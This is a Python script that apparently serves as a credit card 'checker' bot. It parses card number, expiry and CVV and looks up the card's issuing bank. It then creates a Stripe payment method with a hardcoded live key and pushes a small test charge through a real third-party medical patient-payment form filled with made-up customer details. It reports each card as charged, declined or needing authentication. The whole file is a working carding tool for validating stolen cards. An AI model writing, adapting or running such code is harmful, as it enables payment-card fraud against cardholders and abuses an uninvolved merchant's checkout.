# s1.py
import aiohttp
import asyncio
import re
import time
import json

async def stripe_1d(text):
    start_time = time.time()
    print("Processing card...")
    
    # Enhanced regex pattern to capture card details more reliably
    pattern = r'(?:\b|\D)(\d{16})(?:\b|\D)[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})(?:\b|\D)'
    match = re.search(pattern, text)

    if not match:
        return "❌ Invalid card format. Please provide valid card details in the format: NUMBER|MM|YY|CVV"

    card_number = match.group(1)
    month = match.group(2).zfill(2)  # Ensure two-digit month
    year = match.group(3)
    cvv = match.group(4)

    # Handle two-digit year
    if len(year) == 2:
        year = "20" + year
        
    n = card_number
    cvc = cvv
    mm = month
    yy = year
    full_card = f"{n}|{mm}|{yy}|{cvc}"

    # Get BIN information
    try:
        bin_url = f'https://bins.antipublic.cc/bins/{n[:6]}'  # Use first 6 digits for BIN
        async with aiohttp.ClientSession() as session:
            async with session.get(bin_url, timeout=aiohttp.ClientTimeout(total=5)) as bin_response:
                if bin_response.status == 200:
                    z = await bin_response.json()
                    bin_info = z.get('bin', 'N/A')
                    bank = z.get('bank', 'N/A')
                    brand = z.get('brand', 'N/A')
                    card_type = z.get('type', 'N/A')
                    level = z.get('level', 'N/A')
                    country = z.get('country_name', 'N/A')
                    flag = z.get('country_flag', '')
                    currencies = z.get('country_currencies', [])
                    currency = currencies[0] if currencies else 'N/A'
                else:
                    # Set default values if BIN lookup fails
                    bin_info, bank, brand, card_type, level, country, flag, currency = (
                        'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A', '', 'N/A'
                    )
    except asyncio.TimeoutError:
        bin_info, bank, brand, card_type, level, country, flag, currency = (
            'N/A', 'BIN Timeout', 'N/A', 'N/A', 'N/A', 'N/A', '', 'N/A'
        )
    except Exception as e:
        print(f"BIN lookup error: {str(e)}")
        bin_info, bank, brand, card_type, level, country, flag, currency = (
            'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A', '', 'N/A'
        )

    # Stripe Payment Method creation
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    
    stripe_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': 'N/A',
        'muid': 'N/A', 
        'sid': 'N/A',   
        'payment_user_agent': 'stripe.js/v3',
        'key': 'pk_live_51RQV5kGAIBYDmNVzqhTEEAkHL2GCWfuFKhiIyjnr7lKYGG6mgIc4Boj71MPD2dMHPjw7BHcWqw2asYbRMtLylrTo00IyNhMakJ',
    }

    payment_method_id = None
    stripe_error = None
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=stripe_headers, 
                data=stripe_data,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as stripe_response:
                stripe_json = await stripe_response.json()
                
                if stripe_response.status == 200:
                    payment_method_id = stripe_json.get('id')
                    if not payment_method_id:
                        stripe_error = "No Payment Method ID received from Stripe"
                else:
                    error_data = stripe_json.get('error', {})
                    stripe_error = error_data.get('message', 'Unknown Stripe error')
                    if 'code' in error_data:
                        stripe_error = f"{stripe_error} (Code: {error_data['code']})"
                        
    except asyncio.TimeoutError:
        stripe_error = "Stripe API timeout"
    except Exception as e:
        stripe_error = f"Stripe request error: {str(e)}"

    if stripe_error or not payment_method_id:
        elapsed_time = time.time() - start_time
        return f"""
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱

𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ {stripe_error or 'Failed to create payment method'}

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ SOAOAN
        """

    # Process payment with the obtained payment method ID
    payment_headers = {
        'authority': 'specializedplace.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://specializedplace.com',
        'referer': 'https://specializedplace.com/patient-payment-form/',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    payment_params = {
        't': str(int(time.time() * 1000)),
    }

    payment_data = {
        'data': f'__fluent_form_embded_post_id=1096&_fluentform_5_fluentformnonce=c20becbcc7&_wp_http_referer=%2Fpatient-payment-form%2F&input_text=Sai%20Lauo&email=saiwonelurn7%40gmail.com&input_text_1=Gop%20Fuo&dropdown=Sober%20Living&address_1%5Baddress_line_1%5D=127%20Allen%20St&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&custom-payment-amount=0.5&payment_method=stripe&__entry_intermediate_hash=a58bbd392f97fcf699e52e1ad05c773f&__stripe_payment_method_id={payment_method_id}',
        'action': 'fluentform_submit',
        'form_id': '5',
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                'https://specializedplace.com/wp-admin/admin-ajax.php', 
                params=payment_params, 
                headers=payment_headers, 
                data=payment_data,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as response:
                response_text = await response.text()
                
                # Calculate elapsed time
                elapsed_time = time.time() - start_time

                if "Thank" in response_text or "success" in response_text.lower():
                    return f"""        	
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱
                        
𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ Charge Successful ✅

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ SOAOAN
                        """
                elif "Authentication" in response_text or "authentication" in response_text.lower():
                    return f"""
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱    
    
𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ Authentication Required ⚠️

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ SOAOAN
                        """
                else:
                    # Try to parse JSON response for error details
                    try:
                        response_json = json.loads(response_text)
                        errors = response_json.get('errors', {})
                        if errors:
                            error_msg = "; ".join([f"{k}: {v}" for k, v in errors.items()])
                        else:
                            error_msg = response_json.get('message', 'Unknown error')
                    except:
                        error_msg = 'Payment failed'
                        
                    return f"""
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱

𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ {error_msg} ❌

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ SOAOAN
                        """
    except asyncio.TimeoutError:
        elapsed_time = time.time() - start_time
        return f"""
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱

𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ Payment Gateway Timeout ⏱️

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ SOAOAN
        """
    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱

𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ Payment Error: {str(e)} ❌

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ SOAOAN
        """

# Example usage
async def main():
    # Test with a sample card (use a test card in practice)
    test_card = "4242424242424242|12|2025|123"
    result = await stripe_1d(test_card)
    print(result)

if __name__ == "__main__":
    asyncio.run(main())
